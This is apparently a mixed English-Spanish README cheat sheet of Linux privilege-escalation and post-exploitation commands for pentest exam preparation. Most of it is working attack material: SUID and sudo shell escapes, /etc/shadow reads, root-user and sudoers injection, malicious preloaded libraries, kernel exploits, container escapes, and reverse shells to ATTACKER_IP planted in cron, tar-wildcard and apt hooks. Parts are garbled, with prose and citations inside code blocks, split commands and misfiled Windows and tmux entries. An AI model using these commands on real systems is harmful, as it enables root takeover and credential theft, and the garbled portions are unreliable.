# 🐧 Linux Privilege Escalation & Post-Exploitation Playbook

<p align="center">
  <a href="https://araizcorp.tech"><img src="https://img.shields.io/badge/Official_Website-araizcorp.tech-1f425f?style=for-the-badge&logo=firefox" /></a>
  <a href="https://academy.araizcorp.tech"><img src="https://img.shields.io/badge/Academy_Labs-academy.araizcorp.tech-red?style=for-the-badge&logo=target" /></a>
  <img src="https://img.shields.io/badge/Commands-653+-brightgreen?style=for-the-badge" />
</p>

---

An exhaustive, production-grade **Linux Privilege Escalation & Post-Exploitation Reference** covering GTFOBins, Sudo misconfigurations, SUID/SGID, Capabilities, Container Breakouts, and Kernel Exploits, authored by [AraizCorp](https://araizcorp.tech).

Curated for penetration testers, security researchers, and engineers preparing for offensive security exams and industry assessments (*OSCP, CPTS, eWPTX, CRTO*).

---

## 📑 Table of Contents

- [01 — Automated System Enumeration & Triage](#01-automated-system-enumeration-triage) (19 commands)
- [02 — SUID & SGID Binary Exploitation (GTFOBins)](#02-suid-sgid-binary-exploitation-gtfobins) (42 commands)
- [03 — Sudo Privileges & NOPASSWD Misconfigurations](#03-sudo-privileges-nopasswd-misconfigurations) (15 commands)
- [04 — Scheduled Tasks, Cron Jobs & Wildcard Injection](#04-scheduled-tasks-cron-jobs-wildcard-injection) (22 commands)
- [05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)](#05-linux-capabilities-abuse-capsetuid-capdacreadsearch) (7 commands)
- [06 — Internal Services & Local Sockets Exploitation](#06-internal-services-local-sockets-exploitation) (13 commands)
- [07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection](#07-path-hijacking-ldpreload-shared-library-injection) (14 commands)
- [08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)](#08-linux-kernel-exploitation-dirty-cow-dirty-pipe-local-cves) (20 commands)
- [09 — Insecure NFS Mounts & no_root_squash Exploitation](#09-insecure-nfs-mounts-norootsquash-exploitation) (14 commands)
- [10 — Docker Containers, Socket Mounting & Container Escapes](#10-docker-containers-socket-mounting-container-escapes) (17 commands)
- [11 — Core System Commands & Linux Post-Exploitation](#11-core-system-commands-linux-post-exploitation) (440 commands)
- [12 — AI/ML Red Team Drill: PyTorch / MONAI Model Serialization Exploit](#12-aiml-red-team-drill-pytorch-monai-model-serialization-exploit) (30 commands)
- [🎓 Advanced Hands-On Training](#-advanced-hands-on-training)

---

## 01 — Automated System Enumeration & Triage

#### HERRAMIENTAS AUTOMATIZADAS / LinPEAS: Descarga contenido o ficheros desde una URL.
```bash
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
```

#### HERRAMIENTAS AUTOMATIZADAS / LinPEAS
```bash
chmod +x linpeas.sh
```

#### HERRAMIENTAS AUTOMATIZADAS / LinPEAS: Ejecuta un script o binario auxiliar.
```bash
./linpeas.sh
```

#### HERRAMIENTAS AUTOMATIZADAS / Otras herramientas: Descarga contenido o ficheros desde una URL.
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### CHECKLIST RÁPIDO / Usuarios y grupos → id, sudo l, /etc/passwd: Ejecuta un script o binario auxiliar.
```bash
linpeas.sh
```

#### ️ RECURSOS Y HERRAMIENTAS / Scripts de enumeración: Encadena comandos o filtra resultados para obtener información más útil.
```bash
chmod +x LinEnum.sh && ./LinEnum.sh
```

#### ️ RECURSOS Y HERRAMIENTAS / Scripts de enumeración: Encadena comandos o filtra resultados para obtener información más útil.
```bash
chmod +x linpeas.sh && ./linpeas.sh
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
winpeas.exe > output.txt
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
winpeas.exe quiet cmd fast
```

#### Command execution
```bash
(Pentest Money, 2019), http://pentestmonkey.net/tools/audit/unix-privesc-check ↩︎
```

#### Command execution
```bash
(Rebootuser. 2022), https://github.com/rebootuser/LinEnum ↩︎
```

#### Command execution
```bash
(Polop. 2022), https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS ↩︎
```

#### pspy: monitor de procesos sin root. Detecta comandos ejecutados por cron/root en tiempo real. IMPRESCINDIBLE para detectar tareas ocultas
```bash
find / -name 'pspy*' 2>/dev/null ; wget http://ATTACKER_IP/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

#### LinPEAS directo: enumeración automática completa. La herramienta más completa para Linux. Resultado codificado por colores (rojo = crítico)
```bash
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
```

#### LinPEAS desde tu servidor. Guarda output en archivo para revisar con calma
```bash
wget http://ATTACKER_IP/linpeas.sh -O /tmp/linpeas.sh && chmod +x /tmp/linpeas.sh && /tmp/linpeas.sh 2>/dev/null | tee /tmp/linpeas_out.txt
```

#### LinPEAS con -a (all checks): más lento pero más completo. Incluye checks de red, procesos, etc.
```bash
wget http://ATTACKER_IP/linpeas.sh -O /tmp/lp.sh && chmod +x /tmp/lp.sh && /tmp/lp.sh -a 2>/dev/null | tee /tmp/lp_out.txt
```

#### LinEnum con -t (thorough): enumeración alternativa a LinPEAS
```bash
wget http://ATTACKER_IP/LinEnum.sh -O /tmp/le.sh && chmod +x /tmp/le.sh && /tmp/le.sh -t 2>/dev/null
```

#### pspy: monitoriza procesos en tiempo real sin privilegios. Imprescindible para detectar cron jobs y comandos ejecutados por root
```bash
wget http://ATTACKER_IP/pspy64 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

#### pspy versión 32 bits para sistemas x86
```bash
wget http://ATTACKER_IP/pspy32 -O /tmp/pspy && chmod +x /tmp/pspy && /tmp/pspy
```

---

## 02 — SUID & SGID Binary Exploitation (GTFOBins)

#### NOTAS IMPORTANTES PARA PENTESTERS
```bash
find / -perm -4000 -type f
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Busca binarios SUID o SGID aprovechables.
```bash
find / -perm /4000 2>/dev/null
```

#### SISTEMA DE ARCHIVOS / Búsqueda de archivos: Busca binarios SUID o SGID aprovechables.
```bash
find / -perm /2000 2>/dev/null
```

#### ️ BINARIOS PRIVILEGIADOS / SUID/SGID: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -perm -u=s -type f 2>/dev/null
```

#### ️ BINARIOS PRIVILEGIADOS / SUID/SGID: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find / -perm -g=s -type f 2>/dev/null
```

#### ️ BINARIOS PRIVILEGIADOS / SUID/SGID: Enumera capabilities asignadas a binarios.
```bash
getcap -r / 2>/dev/null
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Encadena comandos o filtra resultados para obtener información más útil.
```bash
find . -exec /bin/sh -p \; -quit
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Encadena comandos o filtra resultados para obtener información más útil.
```bash
vim -c ':py3 import os; os.setuid(0); os.execl("/bin/sh", "sh", "-c", "reset; exec sh")'
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Encadena comandos o filtra resultados para obtener información más útil.
```bash
/usr/bin/base64 /etc/shadow | /usr/bin/base64 -d
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación
```bash
echo '[Service]
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación
```bash
ExecStart=/bin/sh -c "chmod +s /bin/bash"
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación
```bash
WantedBy=multi-user.target' > $TF
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Gestiona o activa servicios de systemd.
```bash
systemctl link $TF
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Gestiona o activa servicios de systemd.
```bash
systemctl enable --now $TF
```

#### ️ BINARIOS PRIVILEGIADOS / GTFOBins Ejemplos de explotación: Abre una shell preservando privilegios efectivos.
```bash
bash -p
```

#### ⚡ ABUSO DE SUDO / GTFOBins Ejemplos comunes: Encadena comandos o filtra resultados para obtener información más útil.
```bash
sudo find . -exec /bin/sh \; -quit
```

#### ⚡ ABUSO DE SUDO / GTFOBins Ejemplos comunes
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
```

#### ⚡ ABUSO DE SUDO / GTFOBins Ejemplos comunes
```bash
sudo nano -s /bin/sh
```

#### ⚡ ABUSO DE SUDO / GTFOBins Ejemplos comunes
```bash
sudo vim -c ':!sh'
```

#### ⚡ ABUSO DE SUDO / GTFOBins Ejemplos comunes
```bash
sudo less /etc/hosts
```

#### Command execution
```bash
Podemos utilizar find para buscar binarios marcados con SUID. En este caso, comenzamos nuestra búsqueda en el directorio raíz ( / ), buscamos archivos ( -type f ) con el bit SUID activado, ( -perm -u=s ) y descartamos todos los mensajes de error ( 2>/dev/null ):
```

#### Command execution
```bash
En este caso, el comando encontró varios binarios SUID. La explotación de los binarios SUID variará en función de varios factores. Por ejemplo, si /bin/cp (el comando de copia ) fuera SUID, podríamos copiar y sobrescribir archivos confidenciales como /etc/passwd .
```

#### Si cp tiene sudo: copia bash con SUID
```bash
sudo /usr/bin/cp /bin/bash /tmp/rootbash && sudo chmod +s /tmp/rootbash && /tmp/rootbash -p
```

#### Lista binarios SUID con permisos. Comparar con una instalación limpia o revisar en GTFOBins
```bash
find / -perm -u=s -type f 2>/dev/null | xargs ls -la
```

#### Python con SUID: -p preserva el EUID root
```bash
python3 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

#### Vim con SUID: usa Python3 integrado para spawn bash con EUID root
```bash
/usr/bin/vim.basic -c ':py3 import os; os.execl("/bin/bash","bash","-p")'
```

#### cp con SUID: copia shadow al /tmp y léelo
```bash
cp /etc/shadow /tmp/ && cat /tmp/shadow
```

#### Si openssl tiene SUID puedes hashear una nueva contraseña para meter en /etc/passwd
```bash
cat /etc/shadow | openssl passwd -1 -stdin
```

#### Si puedes escribir /etc/passwd: añade usuario con UID 0 (hash generado con openssl passwd -1 'contraseña')
```bash
echo 'hacker:$1$xyz$hash:0:0:root:/root:/bin/bash' >> /etc/passwd
```

#### base64 con SUID: lee archivos privilegiados (encode/decode)
```bash
base64 /etc/shadow | base64 -d
```

#### xxd con SUID: lee archivos privilegiados en hex
```bash
xxd /etc/shadow | xxd -r
```

#### tee con SUID: escribe en archivos de root. Pipe tu contenido por stdin
```bash
tee /etc/passwd < /dev/stdin
```

#### nmap SUID (versiones antiguas): ejecuta script NSE con os.execute
```bash
nmap --script=/tmp/shell.nse  # shell.nse: os.execute('/bin/bash')
```

#### Si dash tiene SUID: igual que bash -p
```bash
dash -p
```

#### Ver PATH + binarios SUID. Si el PATH incluye /tmp o . es vulnerable directamente
```bash
echo $PATH && find / -perm -u=s -type f 2>/dev/null
```

#### Buscar comandos llamados sin ruta absoluta dentro del binario SUID. Esos son candidatos a hijacking
```bash
strings /ruta/binario_suid 2>/dev/null | grep -v '/' | grep -E '^[a-z]{2,}$'
```

#### ltrace: ver llamadas a exec/system del binario para identificar comandos externos que llama
```bash
ltrace /ruta/binario_suid 2>&1 | grep -E 'exec|system|popen'
```

#### strace: interceptar syscalls execve para ver exactamente qué binarios llama el SUID
```bash
strace -v -f -e execve /ruta/binario_suid 2>&1 | grep execve
```

#### anteponer /tmp al PATH y crear binario falso con el nombre del comando que llama el SUID. Al ejecutar el SUID, carga tu binario con EUID root
```bash
export PATH=/tmp:$PATH
echo -e '#!/bin/bash\nbash -p' > /tmp/NOMBRE_COMANDO
chmod +x /tmp/NOMBRE_COMANDO
/ruta/binario_suid
```

#### Ejemplo completo: si el SUID llama a 'service', crea /tmp/service con tu payload
```bash
cd /tmp && cat > service << 'EOF'
#!/bin/bash
bash -p
EOF
chmod +x service
export PATH=/tmp:$PATH
```

#### Copiar bash al share y darle SUID. Como eres root en el cliente y no hay root_squash, el archivo es root en el servidor
```bash
cp /bin/bash /tmp/nfs_mount/bash_suid && chmod +s /tmp/nfs_mount/bash_suid
```

#### Ejecutar en el target la bash con SUID — shell root
```bash
/share/bash_suid -p
```

---

## 03 — Sudo Privileges & NOPASSWD Misconfigurations

#### NOTAS IMPORTANTES PARA PENTESTERS: Enumera qué comandos puede ejecutar el usuario con sudo.
```bash
sudo -l
```

#### USUARIOS Y GRUPOS / Grupos y privilegios
```bash
sudo -ll
```

#### VARIABLES DE ENTORNO SUDO / LD PRELOAD Exploit
```bash
sudo LD_PRELOAD=/tmp/preload.so [PROGRAM]
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
sudo cat /etc/sudoers | grep pwfeedback
```

#### 🐧 CVE-2019-18634 – sudo pwfeedback Buffer Overflow (Root PrivEsc)
```bash
sudo grep -r pwfeedback /etc/sudoers*
```

#### Archivo sudoers completo si es legible
```bash
cat /etc/sudoers 2>/dev/null
```

#### Si tee tiene sudo: escribe tu usuario en sudoers
```bash
sudo /usr/bin/tee /etc/sudoers <<< 'username ALL=(ALL) NOPASSWD:ALL'
```

#### Si sudoers tiene env_keep con LD_PRELOAD: carga una shared library maliciosa al ejecutar cualquier binario sudo
```bash
# env_keep bypass LD_PRELOAD
# En sudoers: Defaults env_keep+=LD_PRELOAD
cat /tmp/pe.c  # content: void _init(){system("/bin/bash -p");}
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
sudo LD_PRELOAD=/tmp/pe.so cualquier_binario_permitido
```

#### Si sudoers permite LD_PRELOAD: puedes precargar una shared library maliciosa al ejecutar cualquier binario con sudo
```bash
# Comprobar si sudoers tiene env_keep con LD_PRELOAD
sudo -l | grep -i ld_preload
```

#### Compilar shared library maliciosa. _init() se ejecuta al cargar la librería
```bash
# Crear shared library maliciosa
cat > /tmp/pe.c << 'EOF'
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}
EOF
gcc -fPIC -shared -nostartfiles -o /tmp/pe.so /tmp/pe.c
```

#### Ejecutar cualquier binario con sudo + LD_PRELOAD → ejecuta _init() como root antes que el binario real
```bash
sudo LD_PRELOAD=/tmp/pe.so /usr/bin/cualquier_binario_permitido
```

#### ldd: muestra las librerías que necesita un binario. 'not found' = hueco para hijacking
```bash
# Library hijacking: si un binario carga .so con ruta relativa
ldd /ruta/binario | grep 'not found'
```

#### Si RPATH apunta a un directorio escribible, colocar ahí una .so maliciosa con el nombre de la que falta
```bash
readelf -d /ruta/binario | grep 'RPATH\|RUNPATH'
```

#### Shared library de reemplazo: el constructor se ejecuta automáticamente al cargar la librería
```bash
# Crear la .so de reemplazo
cat > /ruta_escribible/libvulnerable.so.1 << 'EOF'
#include <stdlib.h>
static void malicious() __attribute__((constructor));
void malicious() { system("/bin/bash -p"); }
EOF
gcc -shared -fPIC -o /ruta_escribible/libvulnerable.so.1 /ruta_escribible/libvulnerable.so.1.c
```

#### Alternativa: modificar sudoers directamente a través del bind mount
```bash
docker run --rm -v /etc/sudoers:/mnt/sudoers alpine sh -c "echo 'tuusuario ALL=(ALL) NOPASSWD:ALL' >> /mnt/sudoers"
```

---

## 04 — Scheduled Tasks, Cron Jobs & Wildcard Injection

#### SISTEMA DE ARCHIVOS / Archivos importantes: Muestra el contenido del archivo indicado.
```bash
cat /etc/crontab
```

#### SISTEMA DE ARCHIVOS / Archivos importantes: Lista el contenido de la ruta indicada.
```bash
ls -la /etc/cron.*
```

#### ⏰ ABUSO DE CRON JOBS / Ver tareas programadas: Consulta o modifica tareas cron del usuario.
```bash
crontab -l
```

#### ⏰ ABUSO DE CRON JOBS / Explotar PATH en cron
```bash
echo '#!/bin/bash
```

#### ⏰ ABUSO DE CRON JOBS / Explotar PATH en cron: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
cp /bin/bash /tmp/rootbash
```

#### ⏰ ABUSO DE CRON JOBS / Explotar PATH en cron
```bash
chmod +xs /tmp/rootbash' > /home/user/overwrite.sh
```

#### ⏰ ABUSO DE CRON JOBS / Explotar PATH en cron
```bash
chmod +x /home/user/overwrite.sh
```

#### 🔵 Rsync — Sincronización remota
```bash
nmap -sV -p 873 127.0.0.1
```

#### 🔵 Rsync — Sincronización remota
```bash
nc -nv 127.0.0.1 873
```

#### Command execution
```bash
Rsync es una herramienta de sincronización de archivos conocida por su rapidez y eficiencia, utilizada tanto localmente como para transferencias remotas. Utiliza un algoritmo de transferencia delta que envía solo las diferencias entre archivos, minimizando la cantidad de datos transmitidos. Este enfoque lo hace ideal para copias de seguridad y replicación de datos.
```

#### Command execution
```bash
Vale la pena señalar que los administradores de sistemas a menudo agregan sus propias tareas programadas en el archivo /etc/crontab . Estas tareas deben inspeccionarse cuidadosamente para detectar permisos de archivo inseguros, ya que la mayoría de los trabajos en este archivo en particular se ejecutarán como root. Para ver los trabajos programados del usuario actual, podemos ejecutar crontab seguido del parámetro -l .
```

#### Command execution
```bash
Como se muestra arriba, varios directorios parecen tener permisos de escritura para todo el mundo, incluido el directorio /home/joe/.scripts , que es la ubicación del script de cron que encontramos antes. Esto sin duda justifica una investigación más exhaustiva.
```

#### Command execution
```bash
(Wikipedia, 2019), https://en.wikipedia.org/wiki/Cron ↩︎
```

#### Todas las tareas cron del sistema y del usuario
```bash
cat /etc/crontab && ls -la /etc/cron* && crontab -l 2>/dev/null
```

#### Ver todas las tareas cron del sistema y del usuario actual
```bash
cat /etc/crontab && cat /etc/cron.d/* 2>/dev/null && crontab -l 2>/dev/null
```

#### Scripts en directorios cron periódicos
```bash
ls -la /etc/cron.hourly/ /etc/cron.daily/ /etc/cron.weekly/ /etc/cron.monthly/ 2>/dev/null
```

#### Comprobar si el script ejecutado por cron es escribible por el usuario actual
```bash
ls -la /path/al/script_cron.sh && stat /path/al/script_cron.sh
```

#### Inyectar reverse shell en script de cron que es escribible. Esperar al siguiente ciclo
```bash
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' >> /ruta/script_escribible.sh
```

#### Wildcard injection en tar: crea archivos con nombre de flags de tar. Cuando cron ejecuta tar con wildcard, interpreta los nombres como opciones
```bash
# Wildcard injection en cron con tar
# Si cron ejecuta: tar czf /backup/backup.tar.gz /ruta/*
touch /ruta/--checkpoint=1
touch /ruta/--checkpoint-action=exec=sh\ shell.sh
echo 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' > /ruta/shell.sh
```

#### Wildcard injection en chown: referencia un archivo para cambiar propietario
```bash
# Wildcard injection en cron con chown
# Si cron ejecuta: chown root:root /ruta/*
touch /ruta/'--reference=/etc/passwd'
```

#### Si apt.conf.d es escribible: añadir hook malicioso ejecutado cuando apt corre como root
```bash
ls -la /etc/apt/apt.conf.d/ 2>/dev/null && stat /etc/apt/apt.conf.d/
```

#### Cron apt abuse: hook Pre-Invoke ejecutado antes de apt update como root
```bash
echo 'APT::Update::Pre-Invoke {"/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'"};' > /etc/apt/apt.conf.d/pwn
```

---

## 05 — Linux Capabilities Abuse (cap_setuid, cap_dac_read_search)

#### Python con cap_setuid+ep: setuid(0) y lanza bash como root
```bash
/usr/bin/python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Perl con cap_setuid+ep
```bash
/usr/bin/perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### Ruby con cap_setuid+ep
```bash
/usr/bin/ruby -e 'Process::Sys.setuid(0); exec "/bin/bash"'
```

#### cap_net_raw en tcpdump: captura tráfico de red como usuario no privilegiado
```bash
# cap_net_raw: permite sniffar tráfico aunque no seas root
tcpdump -i eth0 -w /tmp/cap.pcap
```

#### cap_dac_read_search: leer cualquier archivo del sistema ignorando permisos
```bash
# cap_dac_read_search: saltarse permisos de lectura
tar -cvf /tmp/shadow.tar /etc/shadow 2>/dev/null
```

#### cap_chown: cambia el propietario de /etc/shadow para poder leerlo
```bash
# cap_chown: cambiar propietario de cualquier archivo
chown usuario:usuario /etc/shadow
```

#### cap_sys_ptrace: permite ptracearse en cualquier proceso. Inyectar shellcode en proceso root
```bash
# cap_sys_ptrace con python
python3 -c "import ctypes; import ctypes.util; ... # inject shellcode via ptrace"
```

---

## 06 — Internal Services & Local Sockets Exploitation

#### COMANDOS DE RED: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -atupn
```

#### NETSTAT OPCIONES IMPORTANTES: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -plt
```

#### RED Y CONEXIONES / Conexiones de red: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -tulpn
```

#### RED Y CONEXIONES / Conexiones de red: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -ano
```

#### RED Y CONEXIONES / Conexiones de red: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -ltp
```

#### RED Y CONEXIONES / Conexiones de red
```bash
ss -tulpn
```

#### RED Y CONEXIONES / Conexiones de red: Muestra conexiones, puertos abiertos y listeners.
```bash
netstat -s -t
```

#### 🌐 `curl` – El navegador de la terminal
```bash
curl -x 127.0.0.1:8080 https://example.com
```

#### Muestra el estado de la red.
```bash
netstat
```

#### Command execution
```bash
netstat -atupn        # Muestra las escuchas UDP y TCP
```

#### Command execution
```bash
(Bernd Eckenfels, 2003), https://linux.die.net/man/8/netstat ↩︎
```

#### Puertos en escucha con proceso. Buscar servicios internos no expuestos (127.0.0.1) que puedan explotarse
```bash
ss -tulnp && netstat -tulnp 2>/dev/null
```

#### Si tienes acceso al socket Docker sin estar en el grupo docker, también puedes escalar vía API REST
```bash
# Docker socket abuse (si puedes leer /var/run/docker.sock)
curl -s --unix-socket /var/run/docker.sock http://localhost/images/json | python3 -m json.tool | grep RepoTags
```

---

## 07 — PATH Hijacking, LD_PRELOAD & Shared Library Injection

#### ⚡ VARIABLES Y ENTORNO / Variables de entorno
```bash
echo $PATH
```

#### VARIABLES DE ENTORNO SUDO / LD LIBRARY PATH Exploit
```bash
ldd /usr/sbin/apache2
```

#### VARIABLES DE ENTORNO SUDO / LD LIBRARY PATH Exploit
```bash
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
```

#### VARIABLES DE ENTORNO SUDO / LD LIBRARY PATH Exploit
```bash
sudo LD_LIBRARY_PATH=/tmp apache2
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
wmic service get name,displayname,pathname,startmode
```

#### 🚀 WINDOWS PRIVILEGE ESCALATION - AVANZADO
```bash
sc config THMService binPath= "C:\Users\user\rev-svc3.exe" obj= LocalSystem
```

#### ⌨️ Atajos adicionales personalizados
```bash
bind-key | split-window -h -c "#{pane_current_path}"
```

#### ⌨️ Atajos adicionales personalizados
```bash
bind-key - split-window -v -c "#{pane_current_path}"
```

#### 🐳 Docker Container Privilege Escalation – Cgroups Exploit & Capabilities
```bash
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
```

#### Command execution
```bash
host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
```

#### Archivos escribibles por el usuario actual. Excluye /proc y /sys para reducir ruido
```bash
find / -writable -type f ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null
```

#### Directorios escribibles. Relevante para PATH hijacking y library hijacking
```bash
find / -writable -type d ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null
```

#### Archivos modificados más recientemente que /etc/passwd. Útil para detectar cambios recientes
```bash
find / -type f -newer /etc/passwd ! -path '/proc/*' 2>/dev/null | head -20
```

#### Montar el filesystem del host en /mnt/root dentro del contenedor
```bash
lxc config device add ignite host-root disk source=/ path=/mnt/root recursive=true
```

---

## 08 — Linux Kernel Exploitation (Dirty COW, Dirty Pipe & Local CVEs)

#### ️ INFORMACIÓN DEL SISTEMA: Muestra información del kernel y del sistema.
```bash
uname -a
```

#### ️ INFORMACIÓN DEL SISTEMA / Sistema y kernel: Muestra el contenido del archivo indicado.
```bash
cat /proc/version
```

#### ️ INFORMACIÓN DEL SISTEMA / Sistema y kernel: Muestra el contenido del archivo indicado.
```bash
cat /etc/issue
```

#### ️ INFORMACIÓN DEL SISTEMA / Sistema y kernel
```bash
lsb_release -a
```

#### ️ INFORMACIÓN DEL SISTEMA / Sistema y kernel: Muestra el contenido del archivo indicado.
```bash
cat /etc/os-release
```

#### Command execution
```bash
Los archivos /etc/issue y /etc/*-release contienen información sobre la versión y el lanzamiento del sistema operativo. También podemos ejecutar el comando uname -a 5 :
```

#### Command execution
```bash
Los archivos issue y os-release ubicados en el directorio /etc contienen la versión del sistema operativo (Debian 10) e información específica de la versión, incluido el nombre en código de la distribución (buster). El comando uname -a muestra la versión del kernel (4.19.0) y la arquitectura (x86_64).
```

#### Command execution
```bash
(Wikipedia, 2022), https://en.wikipedia.org/wiki/Kernel_(sistema_operativo) ↩︎
```

#### Command execution
```bash
(David MacKenzie, 2003), https://linux.die.net/man/1/uname ↩︎
```

#### Kernel + distro. Buscar CVEs de kernel en searchsploit o exploit-db
```bash
uname -a && cat /etc/os-release
```

#### Versión de kernel + distro. Con esto buscar en: https://github.com/lucyoa/kernel-exploits o searchsploit
```bash
uname -r && cat /etc/os-release
```

#### Buscar exploits de kernel en searchsploit para la versión actual
```bash
searchsploit linux kernel $(uname -r | cut -d. -f1,2)
```

#### Linux Exploit Suggester: analiza el kernel y sugiere exploits aplicables
```bash
wget http://ATTACKER_IP/les.sh -O /tmp/les.sh && bash /tmp/les.sh
```

#### Linux Exploit Suggester 2: versión mejorada con más CVEs
```bash
wget http://ATTACKER_IP/les2.sh -O /tmp/les2.sh && bash /tmp/les2.sh
```

#### DirtyPipe: vulnerabilidad en pipe de Linux que permite escribir en archivos read-only. Afecta kernels 5.8-5.16.10
```bash
# DirtyPipe (CVE-2022-0847) — kernel 5.8 a 5.16.10
# Permite sobreescribir archivos de solo lectura (incluyendo /etc/passwd)
gcc -o /tmp/dirtypipe /tmp/dirtypipe.c && /tmp/dirtypipe /etc/passwd
```

#### DirtyCow: clásico. Race condition COW. Sobreescribir /etc/passwd para añadir usuario root
```bash
# DirtyCow (CVE-2016-5195) — kernels < 4.8.3
# Race condition en copy-on-write
gcc -pthread -o /tmp/dirtycow /tmp/dirtycow.c -lcrypt && /tmp/dirtycow
```

#### Baron Samedit: buffer overflow en sudo. Afecta sudo < 1.9.5p2 en la mayoría de distros hasta 2021
```bash
# Sudo Baron Samedit (CVE-2021-3156) — sudo < 1.9.5p2
sudo --version && python3 exploit_cve_2021_3156.py
```

#### PwnKit: LPE en pkexec de polkit. Afecta todas las distros Linux desde 2009. Muy confiable
```bash
# PwnKit (CVE-2021-4034) — pkexec todas las versiones
# Afecta polkit < 0.119 en todas las distros
cc -Wall --shared -fPIC -nostartfiles -o evil-so.so evil-so.c
cc -Wall -o pwnkit pwnkit.c
./pwnkit
```

#### nf_tables UAF: privilege escalation vía netfilter. Kernels recientes hasta 5.18.1
```bash
# nf_tables (CVE-2022-32250) — kernel < 5.18.1
# Use-after-free en netfilter nf_tables
```

#### Linux Exploit Suggester: analiza el kernel actual y lista CVEs potencialmente aplicables
```bash
wget http://ATTACKER_IP/les.sh -O /tmp/les.sh && bash /tmp/les.sh 2>/dev/null
```

---

## 09 — Insecure NFS Mounts & no_root_squash Exploitation

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Consulta o monta recursos remotos.
```bash
showmount -e <IP>
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS
```bash
mkdir /tmp/mount
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Consulta o monta recursos remotos.
```bash
mount -t nfs <IP>:/share /tmp/mount
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS
```bash
mkdir /tmp/backdoor
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Consulta o monta recursos remotos.
```bash
mount -t nfs <IP>:<SHARE> /tmp/backdoor
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS: Copia o mueve archivos para preparar o alterar el flujo de trabajo.
```bash
cp /bin/bash /tmp/backdoor/
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS
```bash
chmod +s /tmp/backdoor/bash
```

#### ️ SERVICIOS DE RED Y NFS / Montaje NFS
```bash
./bash -p
```

#### ️ SERVICIOS DE RED Y NFS / Servicios de red: Muestra el contenido del archivo indicado.
```bash
cat /etc/services
```

#### ️ SERVICIOS DE RED Y NFS / Servicios de red
```bash
rpcinfo -p <IP>
```

#### ️ SERVICIOS DE RED Y NFS / Servicios de red
```bash
smbclient -L //<IP>
```

#### Shares NFS. Buscar no_root_squash — permite escalar si puedes montar el share desde otro host
```bash
cat /etc/exports 2>/dev/null
```

#### Desde el atacante: ver shares NFS exportados del target
```bash
showmount -e TARGET_IP
```

#### Montar el share NFS como root en tu máquina atacante
```bash
mount -o rw,vers=3 TARGET_IP:/share /tmp/nfs_mount
```

---

## 10 — Docker Containers, Socket Mounting & Container Escapes

#### 🐳 Docker Container Privilege Escalation – Cgroups Exploit & Capabilities
```bash
mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
```

#### 🐳 Docker Container Privilege Escalation – Cgroups Exploit & Capabilities
```bash
chmod a+x /exploit
```

#### 🐳 Docker Engine – TCP Socket Exploitation & Namespace Escape
```bash
nmap -sV -p 2375 10.10.175.253
```

#### 🐳 Docker Engine – TCP Socket Exploitation & Namespace Escape
```bash
curl http://10.10.175.253:2375/version
```

#### 🐳 Docker Engine – TCP Socket Exploitation & Namespace Escape
```bash
docker -H tcp://10.10.175.253:2375 ps
```

